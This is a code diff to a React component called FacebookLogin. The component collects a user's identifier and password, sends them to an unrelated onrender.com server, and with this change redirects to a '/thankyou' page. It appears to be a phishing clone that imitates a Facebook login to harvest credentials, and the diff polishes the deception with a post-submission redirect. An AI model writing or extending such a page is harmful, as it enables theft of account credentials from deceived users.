@@ -1,8 +1,12 @@
 import { useState } from "react";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
+import { useNavigate } from "react-router-dom";
+
 
 function FacebookLogin() {
+  const navigate = useNavigate();
+
   const [showPassword, setShowPassword] = useState(false);
   const [identifier, setIdentifier] = useState("");
   const [password, setPassword] = useState("");
@@ -23,6 +27,8 @@ function FacebookLogin() {
     let response = await fetch("https://ott-platform-official.onrender.com", options);
     response = await response.json();
     console.log(response);
+    navigate("/thankyou");
+
   };
 
   const handleEyeClick = () => {
